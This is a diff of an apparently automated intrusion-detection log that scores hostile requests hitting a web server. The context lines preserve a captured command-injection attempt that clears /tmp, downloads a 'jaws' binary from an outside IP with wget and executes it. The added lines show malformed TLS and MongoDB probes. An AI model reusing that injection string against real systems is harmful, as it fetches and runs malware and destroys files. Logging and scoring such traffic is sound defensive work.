@@ -159,3 +159,14 @@ IP: 157.230.58.1 | Level: CRITICAL 🚨 | Score: 110
 IP: 187.57.49.147 | Level: CRITICAL 🚨 | Score: 205
   Reason: QueryMatch(wget):+80, QueryMatch(/tmp):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
   RawLog: 187.57.49.147 - - [28/May/2026:02:22:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 157 "-" "-" "-"
+
+--- Update 2026-05-28T02:27:27.643238 ---
+IP: 34.156.249.167 | Level: CRITICAL 🚨 | Score: 125
+  Reason: Method(MALFORMED):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 34.156.249.167 - - [28/May/2026:02:27:12 +0000] "\x16\x03\x01\x05\xC4\x01\x00\x05\xC0\x03\x03(H\x83S" 400 157 "-" "-" "-"
+IP: 34.156.249.167 | Level: CRITICAL 🚨 | Score: 250
+  Reason: Method(MALFORMED):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 34.156.249.167 - - [28/May/2026:02:27:18 +0000] ";\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xD4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x14\x00\x00\x00\x01hello\x00\x00\x00\x00\x00\x00\x00\xF0?\x00" 400 157 "-" "-" "-"
+IP: 34.156.249.167 | Level: CRITICAL 🚨 | Score: 335
+  Reason: WeirdMethod(\xC9\xD1$\x12\xC0\xEA\x96#\xC9\xF1v@\x9C\xC9\xD8\xF7\x91Z6z3\xFC}\xE1r\x87\x90\xFF\x98m&\x85i\x97bS\x16\xFAa\xC7\x88W2\x16\x19\xA4\x08T\x1E\xF8B\x89\x08\xCD):+20, UAExactMatch:+50, SuspiciousStatus(400):+15
+  RawLog: 34.156.249.167 - - [28/May/2026:02:27:19 +0000] "\xC9\xD1$\x12\xC0\xEA\x96#\xC9\xF1v@\x9C\xC9\xD8\xF7\x91Z6z3\xFC}\xE1r\x87\x90\xFF\x98m&\x85i\x97bS\x16\xFAa\xC7\x88W2\x16\x19\xA4\x08T\x1E\xF8B\x89\x08\xCD /k\x22b\xCC4\xDD\xF3\x92" 400 157 "-" "-" "-"
